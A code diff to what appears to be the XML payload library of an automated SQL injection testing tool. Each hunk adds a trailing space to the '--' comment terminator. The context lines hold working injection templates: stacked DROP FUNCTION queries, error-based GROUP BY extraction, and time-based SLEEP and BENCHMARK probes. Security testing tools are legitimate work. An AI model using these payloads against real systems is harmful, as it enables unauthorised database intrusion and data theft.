@@ -912,7 +912,7 @@ Formats:
         <vector>; IF(([INFERENCE]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR]);</vector>
         <request>
             <payload>; IF(([RANDNUM]=[RANDNUM]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR]);</payload>
-            <comment>--</comment>
+            <comment>-- </comment>
         </request>
         <response>
             <comparison>; IF(([RANDNUM]=[RANDNUM1]),SELECT [RANDNUM],DROP FUNCTION [RANDSTR]);</comparison>
@@ -1155,7 +1155,7 @@ Formats:
         <vector>OR 1 GROUP BY CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</vector>
         <request>
             <payload>OR 1 GROUP BY CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]',FLOOR(RAND(0)*2)) HAVING MIN(0)</payload>
-            <comment>--</comment>
+            <comment>-- </comment>
         </request>
         <response>
             <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
@@ -1507,7 +1507,7 @@ Formats:
         <vector>; IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]);</vector>
         <request>
             <payload>; SELECT SLEEP([SLEEPTIME]);</payload>
-            <comment>--</comment>
+            <comment>-- </comment>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -1528,7 +1528,7 @@ Formats:
         <vector>; IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM]);</vector>
         <request>
             <payload>; SELECT BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'));</payload>
-            <comment>--</comment>
+            <comment>-- </comment>
         </request>
         <response>
             <time>[DELAYED]</time>
@@ -1779,7 +1779,7 @@ Formats:
         <vector>AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])</vector>
         <request>
             <payload>AND SLEEP([SLEEPTIME])</payload>
-            <comment>--</comment>
+            <comment>-- </comment>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -1819,7 +1819,7 @@ Formats:
         <vector>AND [RANDNUM]=IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
         <request>
             <payload>AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
-            <comment>--</comment>
+            <comment>-- </comment>
         </request>
         <response>
             <time>[DELAYED]</time>
